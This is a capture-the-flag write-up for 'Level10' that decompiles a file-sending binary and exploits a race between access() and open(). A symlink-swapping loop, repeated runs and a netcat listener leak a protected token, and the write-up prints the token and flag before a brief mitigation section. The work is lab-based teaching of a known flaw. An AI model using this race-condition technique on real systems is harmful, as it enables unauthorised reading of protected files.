# Level10

### Tools

### How to solve it

1. After logging in using ssh at level10@(vmIP):

```
ssh level0@000.000.000.000 -p 4242
```

2. When logging in, we get these files:

```
level10 and token
```

3. We verify level10 is an executable, and copy it to our machine to analyze it:

```
scp -P 4242 level10@192.168.0.5:level10 .

```

4. We use ghidra using "import file" under level10 file and analyze it:

```

int main(int argc,char **argv)

{
  char *__cp;
  uint16_t uVar1;
  int iVar2;
  int iVar3;
  ssize_t sVar4;
  size_t __n;
  int *piVar5;
  char *pcVar6;
  int in_GS_OFFSET;
  undefined1 local_1024 [4096];
  sockaddr local_24;
  int local_14;

                    /* Unresolved local var: char * file@[DW_OP_breg4(ESP): +40]
                       Unresolved local var: char * host@[DW_OP_breg4(ESP): +44] */
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (argc < 3) {
    printf("%s file host\n\tsends file to host if you have access to it\n",*argv);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  pcVar6 = argv[1];
  __cp = argv[2];
  iVar2 = access(argv[1],4);
  if (iVar2 == 0) {
                    /* Unresolved local var: int fd@[DW_OP_breg4(ESP): +48]
                       Unresolved local var: int ffd@[DW_OP_breg4(ESP): +52]
                       Unresolved local var: int rc@[DW_OP_breg4(ESP): +56]
                       Unresolved local var: sockaddr_in sin@[DW_OP_breg4(ESP): +4156]
                       Unresolved local var: char[4096] buffer@[DW_OP_breg4(ESP): +60] */
    printf("Connecting to %s:6969 .. ",__cp);
    fflush(stdout);
    iVar2 = socket(2,1,0);
    local_24.sa_data[2] = '\0';
    local_24.sa_data[3] = '\0';
    local_24.sa_data[4] = '\0';
    local_24.sa_data[5] = '\0';
    local_24.sa_data[6] = '\0';
    local_24.sa_data[7] = '\0';
    local_24.sa_data[8] = '\0';
    local_24.sa_data[9] = '\0';
    local_24.sa_data[10] = '\0';
    local_24.sa_data[0xb] = '\0';
    local_24.sa_data[0xc] = '\0';
    local_24.sa_data[0xd] = '\0';
    local_24.sa_family = 2;
    local_24.sa_data[0] = '\0';
    local_24.sa_data[1] = '\0';
    local_24.sa_data._2_4_ = inet_addr(__cp);
    uVar1 = htons(0x1b39);
    local_24.sa_data._0_2_ = uVar1;
    iVar3 = connect(iVar2,&local_24,0x10);
    if (iVar3 == -1) {
      printf("Unable to connect to host %s\n",__cp);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    sVar4 = write(iVar2,".*( )*.\n",8);
    if (sVar4 == -1) {
      printf("Unable to write banner to host %s\n",__cp);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    printf("Connected!\nSending file .. ");
    fflush(stdout);
    iVar3 = open(pcVar6,0);
    if (iVar3 == -1) {
      puts("Damn. Unable to open file");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    __n = read(iVar3,local_1024,0x1000);
    if (__n == 0xffffffff) {
      piVar5 = __errno_location();
      pcVar6 = strerror(*piVar5);
      printf("Unable to read from file: %s\n",pcVar6);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    write(iVar2,local_1024,__n);
    iVar2 = puts("wrote file!");
  }
  else {
    iVar2 = printf("You don\'t have access to %s\n",pcVar6);
  }
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return iVar2;
}

```

5. Researching about access, we can exploit it by using a method called "Race condition" when we use this function to protect an open call
   This condition consist to give a symbolic link to the binary and then switch his target really fast.
   Once in a while the symbolic link will target a custom empty file with all permission required during the access() call and target the token file for the open() call, so we run simultaneously it:
   first: we try to symlink forever in a loop:

```
while true; do ln -fs ~/level10 /tmp/file; ln -fs ~/token /tmp/file; done

```

second we try to access the file in a loop as well:

```
while true; do ./level10 /tmp/file 127.0.0.1; done

```

third: we check this process to see the output with:

```
nc -lk localhost 6969
```

6. Now that we look for some token in the log and we get:

```
woupa2yuojeeaaed06riuj63c
```

7. Now we get the flag with su flag10:

```
feulo4b72j7edeahuete3no7c
```

### How to protect

- Instead of trying to access the file first like :

```
if (access(path, R_OK) == 0)
   fd = open(path, O_RDONLY);
```

- Use the open function earlier , then access:

```
int fd = open(path, O_RDONLY);
	if (fd == -1) {
		perror("open");
		exit(1);
}
```
